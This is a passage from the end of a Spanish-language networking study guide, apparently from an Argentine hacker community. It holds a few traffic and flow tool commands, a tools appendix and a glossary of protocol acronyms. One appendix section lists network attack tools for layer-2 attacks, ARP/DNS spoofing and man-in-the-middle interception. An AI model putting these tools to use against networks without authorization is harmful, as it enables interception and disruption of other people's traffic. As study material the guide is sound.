# Ostinato (tráfico de red)
# mausezahn (generador de tráfico)
mausezahn eth0 -c 1000 -t tcp

# nfdump (análisis de NetFlow)
nfdump -r nfcapd.202605121200 -s ip/flows

# Open vSwitch (SDN)
ovs-vsctl show
ovs-ofctl dump-flows br0
```

---

## 14. Apéndice B — Herramientas

### Simuladores
- GNS3 (recomendado)
- EVE-NG
- Packet Tracer (limitado)
- Mininet ([sdn](../raw/r3d3s-4v4nz4d4s.md#sdn))

### Análisis de Protocolos
- [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) / TShark
- [tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump)
- Scapy ([python](../raw/pyth0n-f0r-h4ck1ng.md))
- Ostinato

### Ataque de [red](../raw/r3d3s-f0nd4m3nt0s.md)
- Yersinia (L2 attacks)
- Loki ([arp](../raw/r3d3s-f0nd4m3nt0s.md#arp)/[dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing))
- [bettercap](../raw/m1tm-m0b1l3.md#bettercap) ([mitm](../raw/m1tm-m0b1l3.md) framework)
- Ettercap (MITM)
- hping3 ([fuzzing](../raw/fuzz1ng.md) de protocolos)

### Routing/Switching
- FRRouting (routing open source)
- Open vSwitch (OpenFlow)
- Bird ([bGP](../raw/r3d3s-4v4nz4d4s.md#bgp))
- Quagga (routing suite [legacy](../raw/l3g4cy-3nt3rpr1s3.md))

### Monitoreo
- PRTG
- LibreNMS
- Observium
- ntopng (NetFlow analysis)
- ELK Stack (logs + NetFlow)

### SDN
- Ryu Controller
- Floodlight Controller
- ONOS Controller
- OpenDaylight
- Mininet (network emulation)

---

## 15. Apéndice C — Glosario

- **AS:** Autonomous System, [red](../raw/r3d3s-f0nd4m3nt0s.md) bajo una administración única
- **ASBR:** Autonomous System Boundary [router](../raw/r3d3s-f0nd4m3nt0s.md#routers)
- **[bGP](../raw/r3d3s-4v4nz4d4s.md#bgp):** Border Gateway Protocol
- **BPDU:** Bridge Protocol Data Unit
- **DSCP:** Differentiated Services Code Point
- **DTP:** Dynamic Trunking Protocol
- **EUI-64:** Extended Unique Identifier (64 bits)
- **FEC:** Forwarding Equivalence Class (MPLS)
- **GRE:** Generic Routing Encapsulation
- **IKE:** Internet Key Exchange
- **IPFIX:** [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) Flow Information Export
- **LDP:** Label Distribution Protocol
- **LER:** Label Edge Router
- **LSA:** Link State Advertisement
- **LSP:** Label Switched Path
- **LSR:** Label Switching Router
- **MED:** Multi-Exit Discriminator (BGP)
- **mGRE:** Multipoint GRE
- **MPLS:** Multiprotocol Label Switching
- **MSTP:** Multiple Spanning Tree Protocol
- **[nat](../raw/r3d3s-f0nd4m3nt0s.md#nat)-T:** [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat) Traversal
- **NDP:** Neighbor Discovery Protocol
- **NHRP:** Next Hop Resolution Protocol
- **[ospf](../raw/r3d3s-4v4nz4d4s.md#ospf):** Open Shortest Path First
- **PBR:** Policy-Based Routing
- **RA:** Router Advertisement (IPv6)
- **RSTP:** Rapid Spanning Tree Protocol
- **SID:** Segment Identifier
- **SLAAC:** Stateless Address Autoconfiguration
- **SR:** Segment Routing
- **STP:** Spanning Tree Protocol
- **TE:** Traffic Engineering
- **[vlan](../raw/r3d3s-f0nd4m3nt0s.md#vlan):** Virtual Local Area Network
- **VPLS:** Virtual Private LAN Service
- **[vpn](../raw/4n0n1m4t0.md#vpn):** Virtual Private Network
- **VRF:** Virtual Routing and Forwarding
- **VTP:** VLAN Trunking Protocol

---

*Versión 1.0 — Mayo 2026*

*Conocé tus protocolos, rompe tus protocolos. La red es el campo de batalla.*

*— La comunidad hacker argentina*


